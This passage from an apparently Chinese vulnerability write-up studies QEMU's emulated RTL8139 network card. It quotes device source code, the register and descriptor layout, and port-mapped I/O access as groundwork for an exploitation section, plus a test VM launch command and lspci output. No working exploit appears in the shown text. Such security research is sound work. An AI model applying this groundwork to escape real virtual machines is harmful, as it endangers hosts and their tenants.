tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ETH_MTU = ip header len + tcp header len + payload */</span></span><br><span class="line"><span class="keyword">int</span> tcp_data_len = ip_data_len - tcp_hlen;</span><br><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br></pre></td></tr></table></figure><p>随后对 <code>tcp_data_len</code> 长度的数据按照 <code>tcp_chunk_size</code> 的大小进行分片发送：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> is_last_frame = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (tcp_send_offset = <span class="number">0</span>; tcp_send_offset &lt; tcp_data_len; </span><br><span class="line">     tcp_send_offset += tcp_chunk_size) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check if this is the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset + tcp_chunk_size &gt;= tcp_data_len)</span><br><span class="line">    &#123;</span><br><span class="line">        is_last_frame = <span class="number">1</span>;</span><br><span class="line">        chunk_size = tcp_data_len - tcp_send_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add 4 TCP pseudoheader fields */</span></span><br><span class="line">    <span class="comment">/* copy IP source and destination fields */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(data_to_checksum, saved_ip_header + <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcp_send_offset)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen, </span><br><span class="line">            (<span class="keyword">uint8_t</span>*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* keep PUSH and FIN flags only for the last frame */</span></span><br><span class="line">    <span class="keyword">if</span> (!is_last_frame)</span><br><span class="line">    &#123;</span><br><span class="line">        TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* recalculate TCP checksum */</span></span><br><span class="line">    ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum;</span><br><span class="line">    p_tcpip_hdr-&gt;zeros      = <span class="number">0</span>;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_proto   = IP_PROTO_TCP;</span><br><span class="line">    p_tcpip_hdr-&gt;ip_payload = cpu_to_be16(tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    p_tcp_hdr-&gt;th_sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + <span class="number">12</span>);</span><br><span class="line">    p_tcp_hdr-&gt;th_sum = tcp_checksum;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* restore IP header */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(eth_payload_data, saved_ip_header, hlen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* set IP data length and recalculate IP checksum */</span></span><br><span class="line">    ip-&gt;ip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* increment IP id for subsequent frames */</span></span><br><span class="line">    ip-&gt;ip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-&gt;ip_id));</span><br><span class="line"></span><br><span class="line">    ip-&gt;ip_sum = <span class="number">0</span>;</span><br><span class="line">    ip-&gt;ip_sum = ip_checksum(eth_payload_data, hlen);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">    rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">        <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add transferred count to TCP sequence number */</span></span><br><span class="line">    p_tcp_hdr-&gt;th_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-&gt;th_seq));</span><br><span class="line">    ++send_count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里封装好的 Ethernet Frame 通过函数 <code>rtl8139_transfer_frame</code> 发送，函数部分代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_transfer_frame</span><span class="params">(RTL8139State *s, <span class="keyword">uint8_t</span> *buf, <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> do_interrupt, <span class="keyword">const</span> <span class="keyword">uint8_t</span> *dot1q_buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">    <span class="keyword">if</span> (TxLoopBack == (s-&gt;TxConfig &amp; TxLoopBack))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> buf2_size;</span><br><span class="line">        <span class="keyword">uint8_t</span> *buf2;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            buf2_size = iov_size(iov, <span class="number">3</span>);</span><br><span class="line">            buf2 = g_malloc(buf2_size);</span><br><span class="line">            iov_to_buf(iov, <span class="number">3</span>, <span class="number">0</span>, buf2, buf2_size);</span><br><span class="line">            buf = buf2;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">"+++ transmit loopback mode\n"</span>);</span><br><span class="line">        rtl8139_do_receive(qemu_get_queue(s-&gt;nic), buf, size, do_interrupt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (iov) &#123;</span><br><span class="line">            g_free(buf2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ------------------------------- cut -------------------------------</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，当设置了 <code>TxLoopBack</code> 标记时，会直接调用 <code>rtl8139_do_receive</code> 接收数据，数据会写入到接收缓冲区中。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="4-1-RTL8139-网卡简介"><a href="#4-1-RTL8139-网卡简介" class="headerlink" title="4.1 RTL8139 网卡简介"></a>4.1 RTL8139 网卡简介</h3><p>QEMU 模拟的 RTL8139 网卡在发送和接收数据时，内部代码分支的走向很大程度上依赖于网卡的状态，对应的结构体为 <code>RTL8139State</code> （位于文件 <code>hw\net\rtl8139.c</code> 中）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RTL8139State</span> &#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    PCIDevice parent_obj;</span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> phys[<span class="number">8</span>]; <span class="comment">/* mac address */</span></span><br><span class="line">    <span class="keyword">uint8_t</span> mult[<span class="number">8</span>]; <span class="comment">/* multicast mask array */</span></span><br><span class="line">    <span class="comment">/* TxStatus0 in C mode*/</span> <span class="comment">/* also DTCCR[0] and DTCCR[1] in C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> TxStatus[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> TxAddr[<span class="number">4</span>];   <span class="comment">/* TxAddr0 */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBuf;       <span class="comment">/* Receive buffer */</span></span><br><span class="line">    <span class="comment">/* internal variable, receive ring buffer size in C mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufferSize;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufPtr;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxBufAddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> IntrStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> IntrMask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> TxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxConfig;</span><br><span class="line">    <span class="keyword">uint32_t</span> RxMissed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CSCR;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  Cfg9346;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config0;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config1;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config3;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config4;</span><br><span class="line">    <span class="keyword">uint8_t</span>  Config5;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>  clock_enabled;</span><br><span class="line">    <span class="keyword">uint8_t</span>  bChipCmdState;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> MultiIntr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeCtrl;</span><br><span class="line">    <span class="keyword">uint16_t</span> BasicModeStatus;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayAdvert;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayLPAR;</span><br><span class="line">    <span class="keyword">uint16_t</span> NWayExpansion;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint16_t</span> CpCmd;</span><br><span class="line">    <span class="keyword">uint8_t</span>  TxThresh;</span><br><span class="line"></span><br><span class="line">    NICState *nic;</span><br><span class="line">    NICConf conf;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C ring mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   currTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* C+ mode */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>   cplus_enabled;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusRxDesc;</span><br><span class="line">    <span class="keyword">uint32_t</span>   currCPlusTxDesc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrLO;</span><br><span class="line">    <span class="keyword">uint32_t</span>   RxRingAddrHI;</span><br><span class="line"></span><br><span class="line">    EEprom9346 eeprom;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span>   TCTR;</span><br><span class="line">    <span class="keyword">uint32_t</span>   TimerInt;</span><br><span class="line">    <span class="keyword">int64_t</span>    TCTR_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tally counters */</span></span><br><span class="line">    RTL8139TallyCounters tally_counters;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Non-persistent data */</span></span><br><span class="line">    <span class="keyword">uint8_t</span>   *cplus_txbuffer;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_len;</span><br><span class="line">    <span class="keyword">int</span>        cplus_txbuffer_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* PCI interrupt timer */</span></span><br><span class="line">    QEMUTimer *timer;</span><br><span class="line"></span><br><span class="line">    MemoryRegion bar_io;</span><br><span class="line">    MemoryRegion bar_mem;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Support migration to/from old versions */</span></span><br><span class="line">    <span class="keyword">int</span> rtl8139_mmio_io_addr_dummy;</span><br><span class="line">&#125; RTL8139State;</span><br></pre></td></tr></table></figure><p><code>RTL8139State</code> 结构体中的许多字段实际上就是 RTL8139 网卡内部的寄存器，关于这些寄存器的描述，可以参考厂商 Realtek 提供的 Datasheet 手册 [8]，下图为 Phrack 文章 [1] 提供的介绍（这里为 RTL8139 网卡在 C+ 模式下的寄存器介绍）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x00    |           MAC0            |            MAR0            |</span><br><span class="line">        +---------------------------+----------------------------+</span><br><span class="line">0x10    |                       TxStatus0                        |</span><br><span class="line">        +--------------------------------------------------------+</span><br><span class="line">0x20    |                        TxAddr0                         |</span><br><span class="line">        +-------------------+-------+----------------------------+</span><br><span class="line">0x30    |        RxBuf      |ChipCmd|                            |</span><br><span class="line">        +-------------+------+------+----------------------------+</span><br><span class="line">0x40    |   TxConfig  |  RxConfig   |            ...             |</span><br><span class="line">        +-------------+-------------+----------------------------+</span><br><span class="line">        |                                                        |</span><br><span class="line">        |             skipping irrelevant registers              |</span><br><span class="line">        |                                                        |</span><br><span class="line">        +---------------------------+--+------+------------------+</span><br><span class="line">0xd0    |           ...             |  |TxPoll|      ...         |</span><br><span class="line">        +-------+------+------------+--+------+--+---------------+</span><br><span class="line">0xe0    | CpCmd |  ... |RxRingAddrLO|RxRingAddrHI|    ...        |</span><br><span class="line">        +-------+------+------------+------------+---------------+</span><br></pre></td></tr></table></figure><ul><li>TxConfig：发送数据相关的配置参数</li><li>RxConfig：接收数据相关的配置参数</li><li>CpCmd：C+ 模式相关配置参数，比如：<ul><li>CplusRxEnd 表示启用接收</li><li>CplusTxEnd 表示启用发送</li></ul></li><li>TxAddr0：Tx descriptors table 相关的物理内存地址<ul><li>0x20 ~ 0x27：Transmit Normal Priority Descriptors Start Address</li><li>0x28 ~ 0x2F：Transmit High Priority Descriptors Start Address</li></ul></li><li>RxRingAddrLO：Rx descriptors table 物理内存地址低 32 位</li><li>RxRingAddrHI：Rx descriptors table 物理内存地址高 32 位</li><li>TxPoll：让网卡检查 Tx descriptors</li></ul><p>关于 <code>Descriptor</code> 的定义，同样可以参考厂商 Realtek 提供的 Datasheet 手册 [8]，下图为 <code>Transmit Descriptor</code> 的定义：</p><p><img src="/uploads/202006/transmit-descriptor.png" alt="RTL8139 网卡 Transmit Descriptor"></p><p>Phrack 文章 [1] 给出的结构体的定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-2-Port-Mapped-I-O"><a href="#4-2-Port-Mapped-I-O" class="headerlink" title="4.2 Port Mapped I/O"></a>4.2 Port Mapped I/O</h3><p>CPU 可以通过以下两种方式和外设进行交互（这里不讨论 IRQ、DMA 等其他交互方式）：</p><ul><li>Memory Mapped I/O 即 MMIO</li><li>Port Mapped I/O 即 PMIO</li></ul><p>MMIO 将外设的内存和寄存器直接映射到系统的地址空间中（这部分空间通常是保留给外设专用的），这样 CPU 通过普通的汇编指令即可和外设进行交互；而 PMIO 则将外设的内存和寄存器映射到隔离的地址空间中（PMIO 地址空间的大小为 64KB），CPU 通过 <code>in</code> 和 <code>out</code> 指令和外设进行交互。</p><p>在 Windows 下，可以通过设备管理器查看设备的 PMIO 地址范围，下图为 VMware SVGA 3D 的 PMIO 地址区间之一：</p><p><img src="/uploads/202006/vmware-svga-3d-pmio.png" alt="VMware SVGA 3D PMIO"></p><p>在 Linux 下可以使用 pciutils 中的 <code>lspci</code> 查看设备的 PMIO 地址区间 [9]，这里测试用的 Ubuntu Server 已经自带了 pciutils，只需要在启动时添加 RTL8139 网卡即可，启动命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> x86_64-softmmu/qemu-system-x86_64 -<span class="built_in">enable</span>-kvm -m 2048 -drive \</span></span><br><span class="line">    file=~/Desktop/vm/ubuntu.img,format=qcow2,if=ide,cache=writeback \</span><br><span class="line">    -netdev user,id=t0, -device rtl8139,netdev=t0,id=nic0 \</span><br><span class="line">    -net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure><p>这里最后一行的作用是把 Ubuntu Server 虚拟机的 22 端口转发到主机的 2222 端口，方便主机通过 SSH 访问虚拟机（VNC Viewer 无法复制粘贴），在主机中执行以下命令即可连接虚拟机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh vmusername@127.0.0.1 -p 2222</span></span><br></pre></td></tr></table></figure><p>通过 <code>lspci</code> 命令可以看到 RTL8139 网卡的 PMIO 的起始地址为 <code>0xC000</code> ，大小为 <code>256</code> 字节：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lspci</span></span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> lspci -s 00:04.0 -v</span></span><br><span class="line">00:04.0 Ethernet controller: Realtek Semiconductor Co., Ltd. RTL-8100/8101L/8139 PCI Fast Ethernet Adapter (rev 20)</span><br><span class="line">Subsystem: Red Hat, Inc. QEMU Virtual Machine</span><br><span class="line">Physical Slot: 4</span><br><span class="line">Flags: bus master, fast devsel, latency 0, IRQ 10</span><br><span class="line">I/O ports at c000 [size=256]</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">Expansion ROM at feb80000 [disabled] [size=256K]</span><br><span class="line">Kernel driver in use: 8139cp</span><br><span class="line">Kernel modules: 8139cp, 8139too</span><br></pre></td></tr></table></figure><h3 id="4-3-PMIO-读写"><a href="#4-3-PMIO-读写" class="headerlink" title="4.3 PMIO 读写"></a>4.3 PMIO 读写</h3><p>通过结构体 <code>RTL8139State</code> 的成员 <code>bar_io</code> 的交叉引用可以定位到函数 <code>pci_rtl8139_realize</code> ，这里对 PMIO 和 MMIO 进行了初始化操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_rtl8139_realize</span><span class="params">(PCIDevice *dev, Error **errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = RTL8139(dev);</span><br><span class="line">    DeviceState *d = DEVICE(dev);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pci_conf;</span><br><span class="line"></span><br><span class="line">    pci_conf = dev-&gt;config;</span><br><span class="line">    pci_conf[PCI_INTERRUPT_PIN] = <span class="number">1</span>;    <span class="comment">/* interrupt pin A */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> start of capability list, but no capability</span></span><br><span class="line"><span class="comment">     * list bit in status register, and offset 0xdc seems unused. */</span></span><br><span class="line">    pci_conf[PCI_CAPABILITY_LIST] = <span class="number">0xdc</span>;</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_io, OBJECT(s), &amp;rtl8139_io_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    memory_region_init_io(&amp;s-&gt;bar_mem, OBJECT(s), &amp;rtl8139_mmio_ops, s,</span><br><span class="line">                          <span class="string">"rtl8139"</span>, <span class="number">0x100</span>);</span><br><span class="line">    pci_register_bar(dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;s-&gt;bar_io);</span><br><span class="line">    pci_register_bar(dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;s-&gt;bar_mem);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO 的读写函数可以从变量 <code>rtl8139_io_ops</code> 中找到：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps rtl8139_io_ops = &#123;</span><br><span class="line">    .read = rtl8139_ioport_read,</span><br><span class="line">    .write = rtl8139_ioport_write,</span><br><span class="line">    .impl = &#123;</span><br><span class="line">        .min_access_size = <span class="number">1</span>,</span><br><span class="line">        .max_access_size = <span class="number">4</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>PMIO 写函数 <code>rtl8139_ioport_write</code> 的定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_ioport_write</span><span class="params">(<span class="keyword">void</span> *opaque, hwaddr addr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (size) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        rtl8139_io_writeb(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        rtl8139_io_writew(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        rtl8139_io_writel(opaque, addr, val);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写的长度可以是字节、字、双字，这里以字节为单位的 PMIO 写函数为 <code>rtl8139_io_writeb</code> ，定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span 